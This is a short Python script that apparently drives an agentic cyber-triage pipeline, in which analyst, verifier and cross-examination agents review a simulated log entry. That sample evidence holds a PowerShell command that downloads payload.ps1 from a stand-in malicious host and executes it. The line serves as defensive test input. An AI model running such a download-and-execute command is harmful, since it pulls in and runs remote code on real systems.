from app.agents.analyst_agent import AnalystAgent
from app.agents.verifier_agent import VerifierAgent
from app.agents.cross_examination import CrossExaminationAgent

def run_cyber_triage():
    print("[*] Initializing Evidence-Locked Agentic Cyber Triage Tool...")
    
    # Sample raw log data (simulating input evidence)
    sample_evidence = (
        "2026-06-06 10:12:33 - User admin executed PowerShell script: "
        "Invoke-WebRequest -Uri http://malicious-server.com/payload.ps1 -OutFile payload.ps1; "
        "Start-Process payload.ps1"
    )

    print("\n--- STEP 1: Analyst Agent Investigating Logs ---")
    analyst = AnalystAgent()
    analyst_result = analyst.analyze_logs(sample_evidence)
    print(f"Status: {analyst_result['status']}")
    
    if analyst_result["status"] != "SUCCESS":
        print(f"Alert/Message: {analyst_result.get('message', 'Unknown issue')}")
        return

    findings = analyst_result["analysis"]
    print(f"Analyst Findings:\n{findings}")

    print("\n--- STEP 2: Verifier Agent Fact-Checking Evidence ---")
    verifier = VerifierAgent()
    verification_result = verifier.verify_findings(sample_evidence, findings)
    print(f"Audit Status: {verification_result['status']}")
    print(f"Audit Report:\n{verification_result['audit_report']}")

    print("\n--- STEP 3: Cross-Examination Agent Challenging Findings ---")
    skeptic = CrossExaminationAgent()
    challenge_result = skeptic.challenge_findings(findings)
    print(f"Challenge Status: {challenge_result['status']}")
    print(f"Counter Analysis:\n{challenge_result['counter_analysis']}")

    print("\n[+] Cyber Triage pipeline completed successfully!")

if __name__ == "__main__":
    run_cyber_triage()